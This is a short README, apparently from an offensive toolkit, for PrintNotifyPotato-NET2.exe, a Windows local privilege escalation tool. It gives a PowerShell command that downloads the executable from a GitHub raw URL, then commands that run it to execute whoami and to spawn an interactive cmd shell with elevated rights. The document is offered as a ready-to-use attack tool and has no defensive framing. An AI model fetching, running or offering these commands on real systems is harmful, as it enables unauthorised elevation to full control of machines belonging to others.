## PrintNotifyPotato-NET2.exe

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|PrintNotifyPotato-NET2|Local privilege escalation|Administrator|[PrintNotifyPotato](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/LPE.png)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/PrintNotifyPotato-NET2.exe" -OutFile "PrintNotifyPotato-NET2.exe"
```

<br />

**execute:**
```powershell
.\PrintNotifyPotato-NET2.exe whoami
.\PrintNotifyPotato-NET2.exe cmd interactive
```
